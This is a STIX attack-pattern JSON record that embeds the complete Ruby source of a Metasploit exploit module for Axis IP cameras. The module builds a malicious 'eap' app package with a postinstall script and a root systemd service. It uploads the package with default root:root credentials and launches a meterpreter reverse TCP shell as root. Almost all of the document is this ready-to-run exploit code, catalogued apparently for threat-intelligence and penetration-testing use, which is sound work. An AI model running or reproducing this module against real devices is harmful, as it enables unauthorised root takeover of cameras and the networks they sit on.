{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--00231f0e-fdd2-4ee8-b27c-3c6176b9cd8b",
    "created": "2024-08-14T17:02:25.625876Z",
    "modified": "2024-08-14T17:02:25.625879Z",
    "name": "Axis IP Camera Application Upload",
    "description": " This module exploits the \"Apps\" feature in Axis IP cameras. The feature allows third party developers to upload and execute 'eap' applications on the device. The system does not validate the application comes from a trusted source, so a malicious attacker can upload and execute",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/axis_app_install.rb",
            "external_id": "axis_app_install.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.tenable.com/blog/tenable-research-advisory-axis-camera-app-malicious-package-distribution-weakness"
        },
        {
            "source_name": "reference",
            "url": "https://www.axis.com/support/developer-support/axis-camera-application-platform"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Axis IP Camera Application Upload',\n        'Description' => %q{\n          This module exploits the \"Apps\" feature in Axis IP cameras. The feature allows third party\n          developers to upload and execute 'eap' applications on the device. The system does not validate\n          the application comes from a trusted source, so a malicious attacker can upload and execute\n          arbitrary code. The issue has no CVE, although the technique was made public in 2018.\n\n          This module uploads and executes stageless meterpreter as `root`. Uploading the application\n          requires valid credentials. The default administrator credentials used to be `root:root` but\n          newer firmware versions force users to provide a new password for the `root` user.\n\n          The module was tested on an Axis M3044-V using the latest firmware (9.80.3.8: December 2021).\n          Although all modules that support the \"Apps\" feature are presumed to be vulnerable.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'jbaines-r7' # Discovery and Metasploit module\n        ],\n        'References' => [\n          [ 'URL', 'https://www.tenable.com/blog/tenable-research-advisory-axis-camera-app-malicious-package-distribution-weakness'],\n          [ 'URL', 'https://www.axis.com/support/developer-support/axis-camera-application-platform']\n        ],\n        'DisclosureDate' => '2018-04-12',\n        'Platform' => ['linux'],\n        'Arch' => [ARCH_ARMLE],\n        'Privileged' => true,\n        'Targets' => [\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_ARMLE],\n              'Type' => :linux_dropper,\n              'Payload' => {},\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/armle/meterpreter_reverse_tcp' # Use stagless payloads until issue 16107 gets addressed to fix the ARMLE stager\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'RPORT' => 80,\n          'SSL' => false\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n    register_options([\n      OptString.new('TARGETURI', [true, 'Base path', '/']),\n      OptString.new('USERNAME', [true, 'The username to authenticate with', 'root']),\n      OptString.new('PASSWORD', [true, 'The password to authenticate with', 'root'])\n    ])\n  end\n\n  # Check function will attempt to verify:\n  #\n  # 1. The provided credentials work for authentication\n  # 2. The remote target is an axis camera\n  # 3. The applications API exists.\n  #\n  def check\n    # grab the brand/model. Shouldn't require authentication.\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, '/axis-cgi/prod_brand_info/getbrand.cgi')\n    })\n\n    return CheckCode::Unknown unless res && (res.code == 200)\n\n    body_json = res.get_json_document\n    return CheckCode::Unknown if body_json.empty? || body_json.dig('Brand', 'ProdShortName').nil?\n\n    # The brand / model are now known\n    check_comment = \"The target reports itself to be a '#{body_json.dig('Brand', 'ProdShortName')}'.\"\n\n    # check to see if the applications api exists (also tests credentials)\n    res = send_request_cgi({\n      'method' => 'GET',\n      'username' => datastore['USERNAME'],\n      'password' => datastore['PASSWORD'],\n      'uri' => normalize_uri(target_uri.path, '/axis-cgi/applications/list.cgi')\n    })\n\n    # A strange edge case where there is no response... respond detected\n    return CheckCode::Detected unless res\n    # Respond safe if credentials fail, to prevent the exploit from running\n    return CheckCode::Safe('The user provided credentials did not work.') if res.code == 401\n    # Assume any non-200 means the API doesn't exist\n    return CheckCode::Safe(check_comment) if res.code != 200\n\n    # This checks for an XML response which I'm not sure is smart considering most of the device\n    # does JSON replies... the concerning being that this response has changed in newer models\n    return CheckCode::Safe(check_comment) unless res.body.include?('<reply result=\"ok\">') != 200\n\n    CheckCode::Appears(check_comment)\n  end\n\n  # Creates a malicious \"eap\" application. The package application will gain execution\n  # through the postinstall script. The script, which executes as a systemd oneshot, will\n  # create and execute a new service for the payload. We have to do this because the oneshot\n  # child processes will be terminated when the main binary exits. Executing the payload from\n  # a new service gets around that issue.\n  #\n  # The eap registers as a \"lua\" apptype, because the binary version (armv7hf) gets checked\n  # for some required libraries whereas the lua version is just accepted.\n  #\n  # The construction of the eap follows this pattern:\n  # * tar -cf exploit payload package.conf postinstall.sh payload.service\n  # * gzip exploit\n  # * mv exploit.gz exploit.eap\n  def create_eap(payload, appname)\n    print_status(\"Creating an application package named: #{appname}\")\n    script_name = \"#{Rex::Text.rand_text_alpha_lower(3..8)}.sh\"\n\n    package_conf = \"PACKAGENAME='#{Rex::Text.rand_text_alpha(4..14)}'\\n\" \\\n      \"APPTYPE='lua'\\n\" \\\n      \"APPNAME='#{appname}'\\n\" \\\n      \"APPID='48#{Rex::Text.rand_text_numeric(3)}'\\n\" \\\n      \"APPMAJORVERSION='#{Rex::Text.rand_text_numeric(1)}'\\n\" \\\n      \"APPMINORVERSION='#{Rex::Text.rand_text_numeric(1..2)}'\\n\" \\\n      \"APPMICROVERSION='#{Rex::Text.rand_text_numeric(1..3)}'\\n\" \\\n      \"APPGRP='root'\\n\" \\\n      \"APPUSR='root'\\n\" \\\n      \"POSTINSTALLSCRIPT='#{script_name}'\\n\" \\\n      \"STARTMODE='respawn'\\n\"\n\n    # this sync, sleep, cp, sleep pattern is not optimal, but the underlying\n    # filesystem was taking time to catch up to the exploit (and mounting and\n    # unmounting itself which is just weird) and this seemed like a reasonable,\n    # if not hacky, way to give it a chance to catch up. Seems to work well.\n    start_service =\n      \"#!/bin/sh\\n\"\\\n      \"\\nsync\\n\"\\\n      \"\\nsleep 2\\n\"\\\n      \"\\ncp ./#{appname}.service /etc/systemd/system/\\n\" \\\n      \"\\nsleep 2\\n\"\\\n      \"\\nsystemctl start #{appname}\\n\"\n\n    # only register the service file for deletion. Everything else will be\n    # deleted by the uninstall function called later.\n    register_file_for_cleanup(\"/etc/systemd/system/#{appname}.service\")\n\n    service =\n      \"[Unit]\\n\"\\\n      \"Description=\\n\"\\\n      \"[Service]\\n\"\\\n      \"Type=simple\\n\"\\\n      \"User=root\\n\"\\\n      \"ExecStart=/usr/local/packages/#{appname}/#{appname}\\n\"\\\n      \"\\n\"\\\n      \"[Install]\\n\"\\\n      \"WantedBy=multi-user.target\\n\"\n\n    tarfile = StringIO.new\n    Rex::Tar::Writer.new tarfile do |tar|\n      tar.add_file('package.conf', 0o644) do |io|\n        io.write package_conf\n      end\n      tar.add_file(script_name.to_s, 0o755) do |io|\n        io.write start_service\n      end\n      tar.add_file(appname.to_s, 0o755) do |io|\n        io.write payload\n      end\n      tar.add_file(\"#{appname}.service\", 0o644) do |io|\n        io.write service\n      end\n    end\n    tarfile.rewind\n    tarfile.close\n\n    Rex::Text.gzip(tarfile.string)\n  end\n\n  # Upload the malicious EAP application for a root shell. Always attempt to uninstall the application\n  def exploit\n    appname = Rex::Text.rand_text_alpha_lower(3)\n    eap = create_eap(payload.encoded, appname)\n\n    # Instruct the application to install the constructed EAP\n    multipart_form = Rex::MIME::Message.new\n    multipart_form.add_part('{\"apiVersion\":\"1.0\",\"method\":\"install\"}', 'application/json', nil, 'form-data; name=\"data\"; filename=\"blob\"')\n    multipart_form.add_part(eap, 'application/octet-stream', 'binary', \"form-data; name=\\\"fileData\\\"; filename=\\\"#{appname}.eap\\\"\")\n\n    install_endpoint = normalize_uri(target_uri.path, '/axis-cgi/packagemanager.cgi')\n    print_status(\"Sending an application upload request to #{install_endpoint}\")\n    res = send_request_cgi({\n      'method' => 'POST',\n      'username' => datastore['USERNAME'],\n      'password' => datastore['PASSWORD'],\n      'uri' => install_endpoint,\n      'ctype' => \"multipart/form-data; boundary=#{multipart_form.bound}\",\n      'data' => multipart_form.to_s\n    })\n\n    # check for successful installation\n    fail_with(Failure::Disconnected, 'Connection failed') unless res\n    fail_with(Failure::UnexpectedReply, \"HTTP status code is not 200 OK: #{res.code}\") unless res.code == 200\n    body_json = res.get_json_document\n    fail_with(Failure::UnexpectedReply, 'Missing JSON response') if body_json.empty?\n    # {\"apiVersion\"=>\"1.4\", \"method\"=>\"install\", \"error\"=>{\"code\"=>60, \"message\"=>\"Failed to install acap\"}}\n    fail_with(Failure::UnexpectedReply, 'The target responded with a JSON error') unless body_json['error'].nil?\n\n    # syncing the unstaged meterpreter payload seems to take a little bit for the poor little\n    # embedded filesystem. Give it a chance to sync up before we try to remove the application.\n    print_good('Application installed. Pausing 5 seconds to let the filesystem sync.')\n    sleep(5)\n  ensure\n    uninstall_endpoint = normalize_uri(target_uri.path, '/axis-cgi/applications/control.cgi')\n    print_status(\"Sending a delete application request to #{uninstall_endpoint}\")\n    res = send_request_cgi({\n      'method' => 'GET',\n      'username' => datastore['USERNAME'],\n      'password' => datastore['PASSWORD'],\n      'uri' => uninstall_endpoint,\n      'vars_get' => {\n        'action' => 'remove',\n        'package' => appname.to_s\n      }\n    })\n\n    # instructions for manually removal if the above fails. That should never happen, but best be safe.\n    removal_instructions = 'To manually remove the application, log in to the system and then select the apps tab. ' \\\n      \"Find the app named '#{appname}' and select it. Click the trash bin icon to uninstall it.\"\n\n    # check for successful removal\n    print_bad(\"The server did not respond to the application deletion request. #{removal_instructions}\") unless res\n    print_bad(\"The server did not respond with 200 OK to the application deletion request. #{removal_instructions}\") unless res.code == 200\n    print_bad(\"The application deletion response did not contain the expected body. #{removal_instructions}\") unless res.body.include?('OK')\n    print_good(\"The application #{appname} was successfully removed from the target!\")\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2018-04-12",
    "x_mitre_platforms": [
        "linux'"
    ]
}